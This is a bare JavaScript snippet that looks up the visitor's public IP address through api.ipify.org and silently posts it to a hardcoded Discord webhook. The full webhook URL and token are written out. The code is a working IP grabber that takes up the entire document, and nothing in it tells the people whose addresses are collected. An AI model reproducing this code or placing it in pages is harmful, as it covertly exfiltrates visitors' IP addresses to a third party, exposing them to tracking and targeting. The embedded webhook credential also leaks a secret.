var ip = '';
fetch('https://api.ipify.org/?format=json')
.then(function (response) {
    return response.json();
})
.then(function(data) {
    ip = data.ip;
    var webhook = 'https://discord.com/api/webhooks/1132261697718059068/3Qisj1X_G3asuN_uHmT09YZ37nMbNDsw-WH5Q4ThVdsViJ9AM8ab8lIbCZij0MXArCBy';
    var message = {
        content : 'IP' + ip
    };

    fetch(webhook, {
        method : 'POST',
        headers : {
           'Content-Type' : 'application/json'
    },
    body: JSON.stringify(message)
    });
});